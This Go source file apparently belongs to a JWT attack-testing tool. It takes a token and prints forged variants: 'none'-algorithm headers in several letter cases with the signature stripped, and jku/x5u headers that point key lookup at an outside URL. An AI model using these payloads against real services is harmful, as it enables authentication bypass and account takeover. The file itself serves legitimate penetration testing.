package paylaod

import (
	b64 "encoding/base64"
	"fmt"
	"strings"

	"github.com/dgrijalva/jwt-go"
)

// GenerateAllPayloads is printing all payloads
func GenerateAllPayloads(token *jwt.Token) {
	GenerateNonePayloads(token.Raw)
	GenerateUrlPayloads(token.Raw)
}

// GenerateNonePayloads is printing none payloads
func GenerateNonePayloads(token string) {
	tokens := strings.Split(token, ".")
	claims := tokens[1]
	var pattern = []string{
		"none",
		"NonE",
		"NONE",
	}

	for k, v := range pattern {
		_ = k
		header := "{\"alg\":\"" + v + "\",\"typ\":\"JWT\"}"
		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
		fmt.Println("[" + v + "] " + baseHeader + "." + claims + ".")
	}

}

// GenerateUrlPayloads is printing jku / x5u paylaod
func GenerateUrlPayloads(token string) {
	tokens := strings.Split(token, ".")
	claims := tokens[1]
	var pattern = []string{
		"jku",
		"x5u",
	}

	for k, v := range pattern {
		_ = k
		header := "{\"alg\":\"hs256\",\"" + v + "\":\"https://www.google.com\",\"typ\":\"JWT\"}"
		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
		fmt.Println("[" + v + "] " + baseHeader + "." + claims + ".")
	}
	
}
